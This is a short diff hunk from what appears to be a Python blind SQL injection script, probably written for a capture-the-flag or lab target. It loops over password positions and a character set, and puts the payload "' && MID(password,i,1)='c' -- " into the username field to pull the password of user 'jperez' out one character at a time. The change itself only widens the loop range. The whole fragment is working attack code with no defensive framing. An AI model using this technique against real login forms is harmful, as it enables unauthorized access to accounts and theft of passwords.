@@ -9,7 +9,7 @@ headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0)
 charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$^&*()-=+{}'
 username = "jperez"
 pwd = ""
-for i in range(1,40):
+for i in range(1,42):
 	for strg in charset:
 		payload_1 = "' && MID(password," + str(i) + ", 1)='"+ strg + "' -- "
 		data = {"username": username + payload_1 , "password": "fdf"}
